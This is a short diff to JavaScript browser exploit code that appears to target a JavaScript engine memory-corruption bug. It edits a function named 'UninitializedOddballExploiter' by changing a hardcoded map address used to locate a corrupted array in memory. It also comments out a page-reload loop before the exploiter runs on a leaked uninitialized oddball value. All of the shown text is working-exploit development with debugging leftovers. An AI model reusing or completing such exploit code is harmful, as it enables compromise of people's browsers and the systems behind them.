@@ -224,10 +224,13 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
     function search_for_length() {
         // %DebugPrint(corrupted_array);
         // alert("dbg");
+        //14d00000
         const old_space = 0x200000;
         //0x2c3741
         //0027be49
-        const array_map = 0x27be49;
+        //14d975c1
+        //00270251
+        const array_map = 0x25fb59;
 
         let start_offset = Math.floor(old_space / 8) + 3;
         try{
@@ -641,13 +644,13 @@ function main() {
     var glob_uninitialized_oddball = leak_uninitialized_oddball();
     // %DebugPrint(glob_uninitialized_oddball);
     
-    if(typeof(glob_uninitialized_oddball) != "undefined"){
-        // alert(typeof(glob_uninitialized_oddball));
-        location.hred = "test15.html"
-        window.location.reload();
-        // console.log("1");
-        // window.location.reload();
-    }
+    // if(typeof(glob_uninitialized_oddball) != "undefined"){
+    //     // alert(typeof(glob_uninitialized_oddball));
+    //     location.hred = "test15.html"
+    //     window.location.reload();
+    //     // console.log("1");
+    //     // window.location.reload();
+    // }
     alert(typeof(glob_uninitialized_oddball));
     UninitializedOddballExploiter(glob_uninitialized_oddball);
 }
